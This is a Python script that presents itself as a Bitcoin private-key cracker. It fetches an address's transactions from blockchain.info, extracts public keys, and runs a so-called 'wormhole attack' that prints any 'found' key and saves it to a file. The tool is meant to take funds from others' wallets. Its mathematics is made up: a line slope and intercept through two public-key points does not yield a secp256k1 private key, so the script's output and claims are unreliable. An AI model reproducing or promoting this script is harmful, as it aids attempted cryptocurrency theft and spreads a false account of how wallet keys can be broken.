import requests
import hashlib
import numpy as np
from fastecdsa.curve import secp256k1
from fastecdsa.point import Point
from sympy import mod_inverse

def fetch_transactions(address):
    url = f"https://blockchain.info/rawaddr/{address}"
    try:
        data = requests.get(url).json()
        return data.get("txs", [])
    except:
        return []

def extract_public_keys(transactions):
    pubkeys = []
    for tx in transactions:
        for inp in tx.get("inputs", []):
            if "script" in inp:
                script = inp["script"]
                if script.startswith("4730") or script.startswith("4830"):
                    pubkey = script[-130:] if len(script) > 130 else script[-66:]
                    pubkeys.append(pubkey)
    return pubkeys

def hex_to_point(pubkey_hex):
    if len(pubkey_hex) == 130:
        x = int(pubkey_hex[2:66], 16)
        y = int(pubkey_hex[66:], 16)
        return Point(x, y, secp256k1)
    return None

def wormhole_attack(pubkeys):
    points = [hex_to_point(pk) for pk in pubkeys if hex_to_point(pk)]
    if len(points) < 2:
        return None
    base = points[0]
    for p in points[1:]:
        if p.x != base.x:
            offset = (p.y - base.y) * mod_inverse(p.x - base.x, secp256k1.q) % secp256k1.q
            private_key = (base.y - offset * base.x) % secp256k1.q
            return hex(private_key)
    return None

def main():
    address = input("Enter Bitcoin Address: ")
    print(f"🔎 Fetching Transactions for {address}")
    transactions = fetch_transactions(address)
    if not transactions:
        print("❌ No transactions found.")
        return
    print(f"✅ {len(transactions)} Transactions Found!")
    
    pubkeys = extract_public_keys(transactions)
    if not pubkeys:
        print("❌ No public keys found.")
        return
    
    print(f"✅ {len(pubkeys)} Public Keys Extracted!")
    private_key = wormhole_attack(pubkeys)
    if private_key:
        print(f"🎯 Private Key Found: {private_key}")
        with open("found.txt", "a") as f:
            f.write(f"{address} : {private_key}\n")
    else:
        print("❌ Vulnerability Not Found!")

if __name__ == "__main__":
    main()
